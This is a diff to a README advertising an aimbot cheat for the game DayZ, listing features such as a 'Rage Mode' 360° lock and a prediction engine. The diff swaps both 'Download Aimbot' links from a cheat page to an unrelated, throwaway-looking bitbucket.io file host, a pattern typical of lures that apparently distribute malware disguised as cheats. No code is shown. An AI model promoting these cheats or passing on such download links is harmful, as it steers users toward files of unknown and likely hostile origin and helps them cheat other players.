@@ -6,7 +6,7 @@
 
 🎮 You aim near them. The cheat handles the rest. 💥
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://wecheaters.github.io/cheats/dayz/)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload14.bitbucket.io)
 ---
 
 ## 🔥 Aimbot Features for Maximum Kill Count
@@ -35,7 +35,7 @@
 * **Rage Mode** – Full 360° lock, instant snap, visible to all (and scary)
 * **Prediction Engine** – Compensates for player movement, ping lag & bullet travel
 
-[![Download Aimbot](https://i.ytimg.com/vi/THwsjZ8TexI/maxresdefault.jpg)](https://wecheaters.github.io/cheats/dayz/)
+[![Download Aimbot](https://i.ytimg.com/vi/THwsjZ8TexI/maxresdefault.jpg)](https://fileoffload14.bitbucket.io)
 ---
 
 ## 🆚 Why Use Aimbot in DayZ?
